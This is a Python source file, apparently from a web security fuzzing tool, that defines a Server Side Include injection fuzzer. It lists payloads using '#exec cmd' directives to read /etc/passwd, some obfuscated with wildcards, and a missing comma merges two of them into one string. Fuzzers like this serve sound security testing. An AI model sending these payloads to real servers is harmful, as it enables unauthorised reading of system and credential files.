#!/usr/bin/env python
# -*- coding: utf-8 -*-

from saker.fuzzers.fuzzer import Fuzzer


class SSI(Fuzzer):

    """Server Side Injection"""

    payloads = [
        '<pre><!--#exec cmd="/etc/passwd" --></pre>'
        '<pre><!--#exec cmd="/bin/cat /etc/passwd" --></pre>',
        '<pre><!--#exec cmd="/bi*/ca? /et*/passw?" --></pre>',
        '<!--#exec cmd="/etc/passwd" -->',
        '<!--#exec cmd="/et*/pa??w?" -->',
    ]

    def __init__(self):
        super(SSI, self).__init__()
